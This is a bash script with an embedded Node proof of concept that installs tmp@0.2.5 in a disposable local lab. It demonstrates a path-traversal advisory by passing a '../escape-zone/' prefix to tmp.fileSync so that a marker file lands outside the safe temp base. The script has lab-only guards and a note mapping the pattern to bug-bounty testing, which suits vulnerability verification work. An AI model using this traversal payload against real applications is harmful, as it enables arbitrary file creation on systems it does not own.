#!/usr/bin/env bash
set -euo pipefail

RUN_ID="tmp_path_traversal_$(date -u +%Y%m%dT%H%M%SZ)"
OUT_BASE="${OUT_BASE:-$PWD/<artifact-output-dir>}"
PACKAGE_VERSION="0.2.5"
APPROVAL=""

emit_json_error() {
  local error="$1"
  local detail="${2:-}"
  python - "$error" "$detail" <<'PY'
import json, sys
print(json.dumps({
    "status": "error",
    "error": sys.argv[1],
    "detail": sys.argv[2],
    "target_touching": False,
}, indent=2))
PY
}

for arg in "$@"; do
  key="${arg%%=*}"
  case "$key" in
    --target|--url|--host|--scope|--live|--scan|--exploit)
      emit_json_error target_like_argument_rejected "$key"
      exit 30
      ;;
  esac
done

while [[ $# -gt 0 ]]; do
  case "$1" in
    --run-id)
      RUN_ID="$2"; shift 2 ;;
    --out-base)
      OUT_BASE="$2"; shift 2 ;;
    --package-version)
      PACKAGE_VERSION="$2"; shift 2 ;;
    --approve-local-lab)
      APPROVAL="$2"; shift 2 ;;
    --help|-h)
      cat <<'EOF'
Usage: tmp_path_traversal_safe_marker_wave1.sh --approve-local-lab RUN_TMP_PATH_TRAVERSAL_ON_LOCAL_LAB [--run-id ID]

Local Kali/victim-lab proof for <specific-ghsa-id> / tmp@0.2.5.
No live targets, no public IP/domain testing, no scanner/fuzzer/DAST.
The proof creates a lab-owned marker file outside a configured safe temp base but still under the run artifact directory.
EOF
      exit 0 ;;
    *)
      emit_json_error unknown_argument "$1"
      exit 30 ;;
  esac
done

if [[ "$APPROVAL" != "RUN_TMP_PATH_TRAVERSAL_ON_LOCAL_LAB" ]]; then
  emit_json_error missing_local_lab_approval "pass --approve-local-lab RUN_TMP_PATH_TRAVERSAL_ON_LOCAL_LAB"
  exit 30
fi

if [[ "$PACKAGE_VERSION" != "0.2.5" ]]; then
  emit_json_error unsupported_package_version "expected vulnerable tmp@0.2.5 for this proof pattern"
  exit 30
fi

command -v node >/dev/null || { emit_json_error missing_tool node; exit 30; }
command -v npm >/dev/null || { emit_json_error missing_tool npm; exit 30; }

OUT_DIR="$OUT_BASE/$RUN_ID"
APP_DIR="$OUT_DIR/app"
TARGET_DIR="$OUT_DIR/target"
SAFE_BASE="$TARGET_DIR/safe-base"
ESCAPE_ZONE="$TARGET_DIR/escape-zone"
mkdir -p "$APP_DIR" "$SAFE_BASE" "$ESCAPE_ZONE"

cd "$APP_DIR"
npm init -y >/dev/null
npm install --no-audit --no-fund "tmp@$PACKAGE_VERSION" >/dev/null

cat > proof_tmp_path_traversal.js <<'JS'
const fs = require('fs');
const os = require('os');
const path = require('path');
const tmp = require('tmp');

const outDir = process.env.OUT_DIR;
const safeBase = process.env.SAFE_BASE;
const marker = process.env.MARKER;

function realInside(parent, child) {
  const parentReal = fs.realpathSync(parent);
  const childReal = fs.realpathSync(child);
  const rel = path.relative(parentReal, childReal);
  return rel === '' || (!rel.startsWith('..') && !path.isAbsolute(rel));
}

const benign = tmp.fileSync({ tmpdir: safeBase, prefix: 'control_' });
fs.writeSync(benign.fd, 'CONTROL_' + marker);
fs.closeSync(benign.fd);

const escaped = tmp.fileSync({ tmpdir: safeBase, prefix: '../escape-zone/TMP_PATH_TRAVERSAL_MARKER_' });
fs.writeSync(escaped.fd, 'VERIFIED_' + marker);
fs.closeSync(escaped.fd);

const result = {
  status: 'ok',
  verdict: 'verified_tmp_path_traversal_arbitrary_file_creation_lab_only',
  target_touching: true,
  authorization_basis: 'local disposable Kali victim-lab / lab-owned artifact directory',
  advisory: '<specific-ghsa-id>',
  package: 'tmp',
  package_version: require('tmp/package.json').version,
  node_version: process.version,
  platform: os.platform(),
  safe_base: safeBase,
  control_path: benign.name,
  escaped_path: escaped.name,
  control_inside_safe_base: realInside(safeBase, benign.name),
  escaped_inside_safe_base: realInside(safeBase, escaped.name),
  escaped_relative_to_safe_base: path.relative(fs.realpathSync(safeBase), fs.realpathSync(escaped.name)),
  escaped_marker_found: fs.readFileSync(escaped.name, 'utf8') === 'VERIFIED_' + marker,
  control_marker_found: fs.readFileSync(benign.name, 'utf8') === 'CONTROL_' + marker,
  stop_before: [
    'no live targets',
    'no public IPs/domains',
    'no secret/system file access',
    'no overwrite outside lab artifact directory',
    'no scanner/fuzzer/DAST',
    'no persistence or credential access'
  ]
};

if (!result.control_inside_safe_base) throw new Error('control escaped safe base');
if (result.escaped_inside_safe_base) throw new Error('expected escaped path outside safe base');
if (!result.escaped_marker_found) throw new Error('escaped marker not found');
if (!result.control_marker_found) throw new Error('control marker not found');

fs.writeFileSync(path.join(outDir, 'proof.json'), JSON.stringify(result, null, 2));
console.log(JSON.stringify(result, null, 2));
JS

MARKER="${RUN_ID}_SAFE_MARKER"
export OUT_DIR SAFE_BASE MARKER
node proof_tmp_path_traversal.js | tee "$OUT_DIR/proof_stdout.json" >/dev/null

python - <<'PY' "$OUT_DIR/proof.json" "$OUT_DIR/summary.md"
import json, sys, pathlib
proof = json.load(open(sys.argv[1], encoding='utf-8'))
summary = pathlib.Path(sys.argv[2])
summary.write_text(f"""# tmp path traversal safe-marker proof — {proof['advisory']}

Status: verified local-lab proof pattern
Verdict: {proof['verdict']}
Boundary: Kali victim-lab/local artifact directory only. No live targets, public IPs/domains, scanner/fuzzer/DAST, secrets, credentials, persistence, or system-file reads.

## Evidence

- Package: {proof['package']}@{proof['package_version']}
- Node: {proof['node_version']}
- Safe base: `{proof['safe_base']}`
- Control path stayed inside safe base: {proof['control_inside_safe_base']}
- Escaped path: `{proof['escaped_path']}`
- Escaped path inside safe base: {proof['escaped_inside_safe_base']}
- Escaped relative path: `{proof['escaped_relative_to_safe_base']}`
- Escaped marker found: {proof['escaped_marker_found']}

## Proof pattern

A vulnerable app that passes attacker-controlled `prefix` into `tmp.fileSync({{ tmpdir, prefix }})` can create a file outside the intended temporary base. This lab proof uses a marker-only escape from `safe-base/` into sibling `escape-zone/`, both under the run artifact directory.

## Live-target prerequisite mapping

For live bounty, this pattern is usable only if the program explicitly allows file/path behavior testing and the proof can be constrained to operator-owned synthetic paths/files. Stop before secret/system-file access, overwrite of existing files, persistence, web-root drop, or non-owned data.
""", encoding='utf-8')
PY

python - <<'PY' "$OUT_DIR/proof.json"
import json, sys
proof=json.load(open(sys.argv[1], encoding='utf-8'))
print(json.dumps({
  'status': 'ok',
  'verdict': proof['verdict'],
  'target_touching': True,
  'artifact_dir': str(__import__('pathlib').Path(sys.argv[1]).parent),
  'escaped_marker_found': proof['escaped_marker_found'],
  'escaped_inside_safe_base': proof['escaped_inside_safe_base'],
}, indent=2))
PY
